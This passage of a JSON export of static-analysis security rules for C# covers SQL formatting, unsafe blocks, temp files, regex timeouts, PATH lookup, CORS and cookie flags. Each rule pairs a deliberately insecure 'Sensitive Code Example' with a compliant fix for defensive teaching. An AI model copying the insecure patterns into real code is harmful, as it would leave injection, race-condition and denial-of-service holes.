[HttpPost]\n    [RequestFormLimits(MultipartBodyLengthLimit = 8388608)] // Compliant: 8388608 B = 8192 KB = 8 MB\n    public IActionResult MultipartFormRequest(Model model)\n    {\n    // ...\n    }\n}\n</pre>\n<p>In Web.config:</p>\n<pre>\n&lt;configuration&gt;\n    &lt;system.web&gt;\n        &lt;httpRuntime maxRequestLength=\"8192\" executionTimeout=\"3600\" /&gt;\n        &lt;!-- Compliant: maxRequestLength is expressed in KB, so 8192 KB = 8 MB  --&gt;\n    &lt;/system.web&gt;\n    &lt;system.webServer&gt;\n        &lt;security&gt;\n            &lt;requestFiltering&gt;\n                &lt;requestLimits maxAllowedContentLength=\"8388608\" /&gt;\n                &lt;!-- Compliant: maxAllowedContentLength is expressed in bytes, so 8388608 B = 8192 KB = 8 MB  --&gt;\n            &lt;/requestFiltering&gt;\n        &lt;/security&gt;\n    &lt;/system.webServer&gt;\n&lt;/configuration&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html\">Owasp Cheat Sheet</a> - Owasp Denial of Service\n  Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config\">Web.config</a> - XML-formatted config file for IIS\n  applications </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S2077": {
        "name": "Formatting SQL queries is security-sensitive",
        "htmlDesc": "<p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the\nquery. However, this rule doesn’t detect SQL injections (unlike rule <a href='/coding_rules#rule_key=csharpsquid%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted\nqueries.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some parts of the query come from untrusted values (like user inputs). </li>\n  <li> The query is repeated/duplicated in other parts of the code. </li>\n  <li> The application must support different types of relational databases. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html\">parameterized queries, prepared\n  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>\n  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic void Foo(DbContext context, string query, string param)\n{\n    string sensitiveQuery = string.Concat(query, param);\n    context.Database.ExecuteSqlCommand(sensitiveQuery); // Sensitive\n    context.Query&lt;User&gt;().FromSql(sensitiveQuery); // Sensitive\n\n    context.Database.ExecuteSqlCommand($\"SELECT * FROM mytable WHERE mycol={value}\", param); // Sensitive, the FormattableString is evaluated and converted to RawSqlString\n    string query = $\"SELECT * FROM mytable WHERE mycol={param}\";\n    context.Database.ExecuteSqlCommand(query); // Sensitive, the FormattableString has already been evaluated, it won't be converted to a parametrized query.\n}\n\npublic void Bar(SqlConnection connection, string param)\n{\n    SqlCommand command;\n    string sensitiveQuery = string.Format(\"INSERT INTO Users (name) VALUES (\\\"{0}\\\")\", param);\n    command = new SqlCommand(sensitiveQuery); // Sensitive\n\n    command.CommandText = sensitiveQuery; // Sensitive\n\n    SqlDataAdapter adapter;\n    adapter = new SqlDataAdapter(sensitiveQuery, connection); // Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void Foo(DbContext context, string query, string param)\n{\n    context.Database.ExecuteSqlCommand(\"SELECT * FROM mytable WHERE mycol=@p0\", param); // Compliant, it's a parametrized safe query\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> Derived from FindSecBugs rules <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA\">Potential SQL/JPQL Injection\n  (JPA)</a>, <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO\">Potential SQL/JDOQL Injection (JDO)</a>, <a\n  href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE\">Potential SQL/HQL Injection (Hibernate)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S6640": {
        "name": "Using unsafe code blocks is security-sensitive",
        "htmlDesc": "<p>Using <code>unsafe</code> code blocks can lead to unintended security or stability risks.</p>\n<p><code>unsafe</code> code blocks allow developers to use features such as pointers, fixed buffers, function calls through pointers and manual memory\nmanagement. Such features may be necessary for interoperability with native libraries, as these often require pointers. It may also increase\nperformance in some critical areas, as certain bounds checks are not executed in an unsafe context.</p>\n<p><code>unsafe</code> code blocks aren’t necessarily dangerous, however, the contents of such blocks are not verified by the Common Language Runtime.\nTherefore, it is up to the programmer to ensure that no bugs are introduced through manual memory management or casting. If not done correctly, then\nthose bugs can lead to memory corruption vulnerabilities such as stack overflows. <code>unsafe</code> code blocks should be used with caution because\nof these security and stability risks.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There are any pointers or fixed buffers declared within the <code>unsafe</code> code block. </li>\n</ul>\n<p>There is a risk if you answered yes to the question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Unless absolutely necessary, do not use <code>unsafe</code> code blocks. If <code>unsafe</code> is used to increase performance, then the <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/standard/memory-and-spans/\">Span and Memory APIs</a> may serve a similar purpose in a safe context.</p>\n<p>If it is not possible to remove the code block, then it should be kept as short as possible. Doing so reduces risk, as there is less code that can\npotentially introduce new bugs. Within the <code>unsafe</code> code block, make sure that:</p>\n<ul>\n  <li> All type casts are correct. </li>\n  <li> Memory is correctly allocated and then released. </li>\n  <li> Array accesses can never go out of bounds. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic unsafe int SubarraySum(int[] array, int start, int end)  // Sensitive\n{\n    var sum = 0;\n\n    // Skip array bound checks for extra performance\n    fixed (int* firstNumber = array)\n    {\n        for (int i = start; i &lt; end; i++)\n            sum += *(firstNumber + i);\n    }\n\n    return sum;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic int SubarraySum(int[] array, int start, int end)\n{\n    var sum = 0;\n\n    Span&lt;int&gt; span = array.AsSpan();\n    for (int i = start; i &lt; end; i++)\n        sum += span[i];\n\n    return sum;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/787\">CWE-787 - Out-of-bounds Write</a> </li>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/unsafe-code\">Microsoft Learn</a> - Unsafe code, pointer types, and\n  function pointers </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S5443": {
        "name": "Using publicly writable directories is security-sensitive",
        "htmlDesc": "<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like\n<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious\nuser can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,\nmodified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2451\">CVE-2012-2451</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-1838\">CVE-2015-1838</a> </li>\n</ul>\n<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It\nalso detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code>, <code>TMPDIR</code> and\n<code>TEMP</code>.</p>\n<ul>\n  <li> <code>/tmp</code> </li>\n  <li> <code>/var/tmp</code> </li>\n  <li> <code>/usr/tmp</code> </li>\n  <li> <code>/dev/shm</code> </li>\n  <li> <code>/dev/mqueue</code> </li>\n  <li> <code>/run/lock</code> </li>\n  <li> <code>/var/run/lock</code> </li>\n  <li> <code>/Library/Caches</code> </li>\n  <li> <code>/Users/Shared</code> </li>\n  <li> <code>/private/tmp</code> </li>\n  <li> <code>/private/var/tmp</code> </li>\n  <li> <code>\\Windows\\Temp</code> </li>\n  <li> <code>\\Temp</code> </li>\n  <li> <code>\\TMP</code> </li>\n  <li> <code>%USERPROFILE%\\AppData\\Local\\Temp</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Files are read from or written into a publicly writable folder </li>\n  <li> The application creates files with predictable names into a publicly writable folder </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Out of the box, .NET is missing secure-by-design APIs to create temporary files. To overcome this, one of the following options can be used:</p>\n<ul>\n  <li> Use a dedicated sub-folder with tightly controlled permissions </li>\n  <li> Created temporary files in a publicly writable folder and make sure:\n    <ul>\n      <li> Generated filename is unpredictable </li>\n      <li> File is readable and writable only by the creating user ID </li>\n      <li> File descriptor is not inherited by child processes </li>\n      <li> File is destroyed as soon as it is closed </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nusing var writer = new StreamWriter(\"/tmp/f\"); // Sensitive\n</pre>\n<pre>\nvar tmp = Environment.GetEnvironmentVariable(\"TMP\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvar randomPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());\n\n// Creates a new file with write, non inheritable permissions which is deleted on close.\nusing var fileStream = new FileStream(randomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose);\nusing var writer = new StreamWriter(fileStream);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP, Insecure Temporary File</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S5445": {
        "name": "Insecure temporary file creation methods should not be used",
        "htmlDesc": "<p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a\nsituation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that\nare not atomic.</p>\n<h2>Why is this an issue?</h2>\n<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a\ngiven file between when the application chooses its name and when it creates it.</p>\n<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be\ndifferent than expected. This can lead to trust boundary issues.</p>\n<h3>What is the potential impact?</h3>\n<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s\nlogic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or\nemptied. They may also alter the file’s content before or while the application uses it.</p>\n<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various\nconsequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>\n<h4>Information disclosure</h4>\n<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.\nThis might be especially critical if this information is sensitive.</p>\n<p>For example, an application might use temporary files to store users' session-related information. In such a case, attackers controlling those\nfiles can access session-stored information. This might allow them to take over authenticated users' identities and entitlements.</p>\n<h4>Attack surface extension</h4>\n<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In\nthat case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In\nsuch a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>\n<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files'\ncontent can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the\napplication hosting server and take it over.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.IO;\n\npublic void Example()\n{\n    var tempPath = Path.GetTempFileName();  // Noncompliant\n\n    using (var writer = new StreamWriter(tempPath))\n    {\n        writer.WriteLine(\"content\");\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.IO;\n\npublic void Example()\n{\n    var randomPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());\n\n    using (var fileStream = new FileStream(randomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose))\n    using (var writer = new StreamWriter(fileStream))\n    {\n        writer.WriteLine(\"content\");\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files' name, location, and\npermissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications' technology stacks.</p>\n<h4>Strong security controls</h4>\n<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling\nfunctions and APIs can also be used for that purpose.</p>\n<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating\nthe files:</p>\n<ul>\n  <li> Files should be created in a non-public directory. </li>\n  <li> File names should be unique. </li>\n  <li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li>\n  <li> File creation should fail if a target file already exists. </li>\n</ul>\n<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>\n<p>Here the example compliant code uses the <code>Path.GetTempPath</code> and <code>Path.GetRandomFileName</code> functions to generate a unique\nrandom file name. The file is then open with the <code>FileMode.CreateNew</code> option that will ensure the creation fails if the file already\nexists. The <code>FileShare.None</code> option will additionally prevent the file from being opened again by any process. To finish, this code ensures\nthe file will get destroyed once the application has finished using it with the <code>FileOptions.DeleteOnClose</code> option.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP</a> - Insecure Temporary File </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S6444": {
        "name": "Not specifying a timeout for regular expressions is security-sensitive",
        "htmlDesc": "<p>Not specifying a timeout for regular expressions can lead to a Denial-of-Service attack. Pass a timeout when using\n<code>System.Text.RegularExpressions</code> to process untrusted input because a malicious user might craft a value for which the evaluation lasts\nexcessively long.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the input passed to the regular expression is untrusted. </li>\n  <li> the regular expression contains patterns vulnerable to <a href=\"https://www.regular-expressions.info/catastrophic.html\">catastrophic\n  backtracking</a>. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> It is recommended to specify a <a\n  href=\"https://learn.microsoft.com/dotnet/standard/base-types/best-practices#use-time-out-values\"><code>matchTimeout</code></a> when executing a\n  regular expression. </li>\n  <li> Make sure regular expressions are not vulnerable to Denial-of-Service attacks by reviewing the patterns. </li>\n  <li> Consider using a non-backtracking algorithm by specifying <a\n  href=\"https://learn.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view=net-7.0\"><code>RegexOptions.NonBacktracking</code></a>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic void RegexPattern(string input)\n{\n    var emailPattern = new Regex(\".+@.+\", RegexOptions.None);\n    var isNumber = Regex.IsMatch(input, \"[0-9]+\");\n    var isLetterA = Regex.IsMatch(input, \"(a+)+\");\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void RegexPattern(string input)\n{\n    var emailPattern = new Regex(\".+@.+\", RegexOptions.None, TimeSpan.FromMilliseconds(100));\n    var isNumber = Regex.IsMatch(input, \"[0-9]+\", RegexOptions.None, TimeSpan.FromMilliseconds(100));\n    var isLetterA = Regex.IsMatch(input, \"(a+)+\", RegexOptions.NonBacktracking); // .Net 7 and above\n    AppDomain.CurrentDomain.SetData(\"REGEX_DEFAULT_MATCH_TIMEOUT\", TimeSpan.FromMilliseconds(100)); // process-wide setting\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n  <li> <a href=\"https://www.regular-expressions.info/catastrophic.html\">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic\n  Backtracking </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">owasp.org</a> - Regular expression Denial of\n  Service - ReDoS </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/dotnet/standard/base-types/best-practices\">docs.microsoft.com</a> - Best practices for regular expressions\n  in .NET </li>\n  <li> <a href=\"https://docs.microsoft.com/dotnet/standard/base-types/backtracking-in-regular-expressions\">docs.microsoft.com</a> - Backtracking in\n  Regular Expressions </li>\n  <li> <a\n  href=\"https://devblogs.microsoft.com/dotnet/regular-expression-improvements-in-dotnet-7/#backtracking-and-regexoptions-nonbacktracking\">devblogs.microsoft.com</a> - Regular Expression Improvements in .NET 7: Backtracking (and RegexOptions.NonBacktracking) </li>\n  <li> <a href=\"https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regex.matchtimeout\">docs.microsoft.com</a> - Regex.MatchTimeout\n  Property </li>\n  <li> <a href=\"https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view=net-7.0\">docs.microsoft.com</a> - RegexOptions\n  Enum (NonBacktracking option) </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S4036": {
        "name": "Searching OS commands in PATH is security-sensitive",
        "htmlDesc": "<p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>\nenvironment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in\n<code>PATH</code> is a directory under his control.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nProcess p = new Process();\np.StartInfo.FileName = \"binary\"; // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nProcess p = new Process();\np.StartInfo.FileName = @\"C:\\Apps\\binary.exe\"; // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/426\">CWE-426 - Untrusted Search Path</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/427\">CWE-427 - Uncontrolled Search Path Element</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "csharpsquid:S5122": {
        "name": "Having a permissive Cross-Origin Resource Sharing policy is security-sensitive",
        "htmlDesc": "<p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269\">CVE-2018-0269</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460\">CVE-2017-14460</a> </li>\n</ul>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">Same origin policy</a> in browsers prevents, by default and for\nsecurity-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)\nfrom its own. The requested target can append additional HTTP headers in response, called <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">CORS</a>, that act like directives for the browser and change the access control policy\n/ relax the same origin policy.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>\n  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>\n  <li> Your access control policy is dynamically defined by a user-controlled input like <a\n  href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\"><code>origin</code></a> header. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>\n  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or\n  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>ASP.NET Core MVC:</p>\n<pre>\n[HttpGet]\npublic string Get()\n{\n    Response.Headers.Add(\"Access-Control-Allow-Origin\", \"*\"); // Sensitive\n    Response.Headers.Add(HeaderNames.AccessControlAllowOrigin, \"*\"); // Sensitive\n}\n</pre>\n<pre>\npublic void ConfigureServices(IServiceCollection services)\n{\n    services.AddCors(options =&gt;\n    {\n        options.AddDefaultPolicy(builder =&gt;\n        {\n            builder.WithOrigins(\"*\"); // Sensitive\n        });\n\n        options.AddPolicy(name: \"EnableAllPolicy\", builder =&gt;\n        {\n            builder.WithOrigins(\"*\"); // Sensitive\n        });\n\n        options.AddPolicy(name: \"OtherPolicy\", builder =&gt;\n        {\n            builder.AllowAnyOrigin(); // Sensitive\n        });\n    });\n\n    services.AddControllers();\n}\n</pre>\n<p>ASP.NET MVC:</p>\n<pre>\npublic class HomeController : ApiController\n{\n    public HttpResponseMessage Get()\n    {\n        var response = HttpContext.Current.Response;\n\n        response.Headers.Add(\"Access-Control-Allow-Origin\", \"*\"); // Sensitive\n        response.Headers.Add(HeaderNames.AccessControlAllowOrigin, \"*\"); // Sensitive\n        response.AppendHeader(HeaderNames.AccessControlAllowOrigin, \"*\"); // Sensitive\n    }\n}\n</pre>\n<pre>\n[EnableCors(origins: \"*\", headers: \"*\", methods: \"GET\")] // Sensitive\npublic HttpResponseMessage Get() =&gt; new HttpResponseMessage()\n{\n    Content = new StringContent(\"content\")\n};\n</pre>\n<p>User-controlled origin:</p>\n<pre>\nString origin = Request.Headers[\"Origin\"];\nResponse.Headers.Add(\"Access-Control-Allow-Origin\", origin); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>ASP.NET Core MVC:</p>\n<pre>\n[HttpGet]\npublic string Get()\n{\n    Response.Headers.Add(\"Access-Control-Allow-Origin\", \"https://trustedwebsite.com\"); // Safe\n    Response.Headers.Add(HeaderNames.AccessControlAllowOrigin, \"https://trustedwebsite.com\"); // Safe\n}\n</pre>\n<pre>\npublic void ConfigureServices(IServiceCollection services)\n{\n    services.AddCors(options =&gt;\n    {\n        options.AddDefaultPolicy(builder =&gt;\n        {\n            builder.WithOrigins(\"https://trustedwebsite.com\", \"https://anothertrustedwebsite.com\"); // Safe\n        });\n\n        options.AddPolicy(name: \"EnableAllPolicy\", builder =&gt;\n        {\n            builder.WithOrigins(\"https://trustedwebsite.com\"); // Safe\n        });\n    });\n\n    services.AddControllers();\n}\n</pre>\n<p>ASP.Net MVC:</p>\n<pre>\npublic class HomeController : ApiController\n{\n    public HttpResponseMessage Get()\n    {\n        var response = HttpContext.Current.Response;\n\n        response.Headers.Add(\"Access-Control-Allow-Origin\", \"https://trustedwebsite.com\");\n        response.Headers.Add(HeaderNames.AccessControlAllowOrigin, \"https://trustedwebsite.com\");\n        response.AppendHeader(HeaderNames.AccessControlAllowOrigin, \"https://trustedwebsite.com\");\n    }\n}\n</pre>\n<pre>\n[EnableCors(origins: \"https://trustedwebsite.com\", headers: \"*\", methods: \"GET\")]\npublic HttpResponseMessage Get() =&gt; new HttpResponseMessage()\n{\n    Content = new StringContent(\"content\")\n};\n</pre>\n<p>User-controlled origin validated with an allow-list:</p>\n<pre>\nString origin = Request.Headers[\"Origin\"];\n\nif (trustedOrigins.Contains(origin))\n{\n    Response.Headers.Add(\"Access-Control-Allow-Origin\", origin);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">developer.mozilla.org</a> - CORS </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">developer.mozilla.org</a> - Same origin policy </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing\">OWASP HTML5 Security\n  Cheat Sheet</a> - Cross Origin Resource Sharing </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/346\">CWE-346 - Origin Validation Error</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/942\">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "csharpsquid:S2092": {
        "name": "Creating cookies without the \"secure\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP\nrequest and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>\n  <li> it’s not sure that the website contains <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\">mixed content</a> or not\n  (ie HTTPS everywhere or not) </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour\n  when creating cookies. </li>\n  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>When the <code>HttpCookie.Secure</code> property is set to <code>false</code> then the cookie will be send during an unencrypted HTTP request:</p>\n<pre>\nHttpCookie myCookie = new HttpCookie(\"Sensitive cookie\");\nmyCookie.Secure = false; // 